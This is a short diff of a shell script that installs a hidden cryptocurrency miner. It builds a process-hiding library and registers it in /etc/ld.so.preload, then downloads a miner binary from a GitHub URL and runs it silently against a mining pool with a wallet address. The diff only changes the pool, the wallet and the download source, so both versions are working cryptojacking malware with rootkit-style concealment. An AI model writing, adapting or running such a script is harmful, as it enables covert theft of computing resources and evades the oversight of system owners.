@@ -10,11 +10,11 @@ cd libprocesshider;make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
-A=hashvault:80
-B=86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5
+A=172.104.176.128:80
+B=ZEPHsBdoBEjW6qK2TqVJhn3TWU2NAoMGMFNJ7puRtWx7Z7hn3pzX2r7JjL481CVau6iLUdRn5eokKJyM8yA8XAt3JyYSgLR88Ed
 C=GAS
-wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox
-./jilox --coin=ZEPH --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
+wget https://github.com/bengetsia/soft/raw/main/jilox && chmod u+x jilox
+./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
 r
 
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
